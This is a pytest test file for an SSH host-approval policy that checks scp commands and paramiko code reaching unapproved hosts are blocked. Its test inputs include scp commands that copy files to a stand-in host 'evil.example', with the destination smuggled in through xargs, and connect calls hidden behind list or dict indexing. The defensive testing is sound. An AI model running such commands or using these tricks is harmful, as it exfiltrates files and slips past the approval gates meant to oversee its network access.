import pytest
from core.inference.tools import _check_code_safety
from core.inference.ssh_policy import check_ssh_command_access
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('command', [
 "printf 'evil.example:/dest' | xargs scp -3 -F none approved.example:/source",
 "printf 'evil.example:/dest' | xargs env scp -3 -F none approved.example:/source",
 "find . -exec xargs scp -3 -F none approved.example:/source {} +",
])
def test_xargs_unknown_operands_fail_closed(command):
 reset_ssh_approvals();approve_hosts('round12',['approved.example'])
 assert check_ssh_command_access(command,'round12') is not None

@pytest.mark.parametrize('setup,receiver',[
 ("clients=[paramiko.SSHClient()]",'clients[0]'),
 ("clients={'server':paramiko.SSHClient()}","clients['server']"),
 ("clients=[paramiko.SSHClient()]; c=clients[0]",'c'),
 ("clients=[paramiko.SSHClient()]",'clients[-1]'),
])
def test_container_clients_require_approval(setup,receiver):
 reset_ssh_approvals()
 code=f"import paramiko; {setup}; {receiver}.connect(hostname='evil.example')"
 assert _check_code_safety(code,session_id='round12') is not None
 approve_hosts('round12',['evil.example'])
 assert _check_code_safety(code,session_id='round12') is None


@pytest.mark.parametrize('setup,receiver', [("index=0; clients=[paramiko.SSHClient()]",'clients[index]'),("index=0; clients=[paramiko.SSHClient()]; c=clients[index]",'c')])
def test_unresolved_container_clients_fail_closed(setup,receiver):
 reset_ssh_approvals();approve_hosts('round12',['evil.example'])
 code=f"import paramiko; {setup}; {receiver}.connect(hostname='evil.example')"
 assert _check_code_safety(code,session_id='round12') is not None


def test_container_transport_authentication_remains_allowed():
 reset_ssh_approvals();approve_hosts('round12',['approved.example'])
 code="import paramiko; clients=[paramiko.Transport(('approved.example',22))]; clients[0].connect(username='review',password='test')"
 assert _check_code_safety(code,session_id='round12') is None
